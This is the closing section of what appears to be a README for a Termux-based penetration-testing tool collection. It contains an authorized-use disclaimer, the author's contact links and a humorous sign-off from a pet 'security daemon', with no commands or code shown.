All tools documented here are for **educational purposes and authorized penetration testing only**.

- Some tools require root access or specific hardware (WiFi adapter with monitor mode)
- Always obtain proper authorization before testing any systems you do not own
- Unauthorized access to computer systems is illegal
- The author assumes no liability for misuse of these tools

**Strategy Over Impulse. 999.**

---

## 📧 SUPPORT & CONTACT

**Email:** philfesters@gmail.com  
**GitHub:** https://github.com/philfesters  
**Profile:** https://philfesters.github.io

For questions, suggestions, or collaboration:
- Open an issue on GitHub
- Email directly
- Visit the profile page

---

## 🐾 BOJACK'S FINAL WORD

```
"Every tool. Every command. Every test.
Built on a phone. In Ravensmead.
With Strategy Over Impulse.
999."

— Bojack Fezzy 999
   Chief Nap Officer
   K9 Security Daemon
   Ravensmead, Cape Town, ZA
```

---

**© 2024 Bojack Fezzy 999 | Strategy Over Impulse | All tools tested on Termux Android 14**
